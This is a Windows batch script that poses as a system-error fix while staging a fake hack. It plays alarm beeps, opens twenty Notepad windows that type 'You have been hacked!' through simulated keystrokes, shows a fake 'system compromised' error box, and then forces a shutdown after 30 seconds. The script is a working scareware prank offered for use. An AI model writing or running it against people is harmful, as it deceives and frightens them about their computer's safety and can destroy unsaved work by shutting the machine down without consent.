@echo off
title System Error
color 0A

echo Warning: System Error Detected! Running Fix...
timeout /t 3 >nul

:: Play scary beeping sounds
powershell -c "[console]::beep(500,700); Start-Sleep -s 1; [console]::beep(700,700); Start-Sleep -s 1; [console]::beep(900,700)"

:: Loop to open Notepad and type "You have been hacked!" with random delays
for /l %%i in (1,1,20) do (
    start notepad
    timeout /t 1 >nul
    powershell -command "$wshell = New-Object -ComObject WScript.Shell; Start-Sleep -s (Get-Random -Minimum 1 -Maximum 3); $wshell.AppActivate('Untitled - Notepad'); Start-Sleep -s 1; $wshell.SendKeys('You have been hacked! {ENTER}')"
)

:: Fake error popup message
powershell -command "[System.Windows.Forms.MessageBox]::Show('Your system has been compromised!', 'Critical Error', 0+16)"

:: OPTIONAL: Force shutdown after 30 seconds (Remove if you don’t want this)
shutdown /s /t 30 /c "System failure detected. Shutting down..."
